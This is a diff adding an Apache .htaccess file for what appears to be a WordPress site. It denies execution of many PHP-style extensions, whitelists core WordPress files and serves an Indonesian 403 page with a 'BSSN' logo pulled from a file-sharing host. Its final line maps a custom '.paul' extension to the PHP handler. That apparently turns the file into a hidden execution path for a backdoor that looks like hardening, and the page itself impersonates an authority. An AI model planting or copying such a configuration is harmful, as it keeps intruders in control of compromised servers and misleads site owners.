@@ -1,0 +1,22 @@
+Options -Indexes
+
+<FilesMatch ".(php|Php|pHp|phP|Php.asp|php.anu|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7|php8|php9|phtml|shtml|php.aspx|php;.jpg|php.fla|php.phar|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|zip|shtml)$"> 
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "(?i).*(ph|sh|pj|env|cg).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "(index|wp-contact|wp-logs|wp-activate|wp-blog-header|wp-comments-post|wp-config-sample|wp-config|wp-cron|wp-links-opml|wp-load|wp-login|wp-mail|wp-setting|wp-signup|wp-trackback)\.php$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+ErrorDocument 403 "<html><head><title>Akses Ditolak</title><style>body {font-family: Arial, sans-serif; color: #333; background-color: #f0f0f0; text-align: center; padding: 50px;} img {width: 150px; margin-bottom: 20px;} h1 {color: #d9534f;} p {font-size: 18px; margin-top: 0;} .ip {font-weight: bold; color: #0275d8;}</style></head><body><img src='https://pomf2.lain.la/f/pwnj4q0n.png' alt='Logo BSSN'><h1>403 - Akses Tidak Diperbolehkan</h1><p>Akses ke halaman ini tidak diizinkan. IP Anda telah dicatat.</p></body></html>"
+
+ErrorDocument 404 "<html><head><title>Halaman Tidak Ditemukan</title><style>body {font-family: Arial, sans-serif; color: #333; background-color: #f0f0f0; text-align: center; padding: 50px;} h1 {color: #ff6347;} p {font-size: 18px;}</style></head><body><h1>404 - Halaman Tidak Ditemukan</h1><p>Oops! Halaman yang Anda cari tidak ada.</p></body></html>"
+
+AddType Application/x-httpd-php .paul
